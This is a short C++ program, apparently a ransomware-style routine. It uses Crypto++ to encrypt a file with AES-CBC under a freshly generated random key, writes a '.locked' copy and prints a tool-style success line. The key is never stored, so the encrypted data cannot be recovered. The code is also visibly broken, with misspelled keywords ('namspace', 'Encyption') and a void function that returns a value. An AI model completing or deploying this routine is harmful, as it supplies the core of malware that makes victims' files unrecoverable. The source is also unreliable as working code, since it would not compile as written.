#include <iostream>
#include <fstream>
#include <windows.h>
#include <cryptlib.h>
#include <aes.h>
#include <modes.h>
#include <osrng.h>
#include <filters.h>
#include <files.h>
#include <base64.h>

using namespace CryptoPP;
using namspace std;

void EncryptFile(const string & inPath,const string& outPath){
    AutoSeededRandomPool prng;

    SecByteBlock key(32);
    SecByteBlock iv(16);

    prng.GenerateBlock(key,key.size());
    prng.GenerateBlock(iv,iv.size());

    CBC_MODE<AES>::Encyption encryptor;
    encryptor.SetKeyWithIV(key,key.size(),iv);

    FileSource fs(inPath.c_str(),true,new StreamTransformationFilter(encryptor,new FileSink(outPath.c_str())
        )
    );
    cout << "[+] File encrypted successfully " << outPath << endl;
    return 0;
}
int main(){
    string file = "any";
    EncryptFile(file,file+".locked");
    return 0;
}
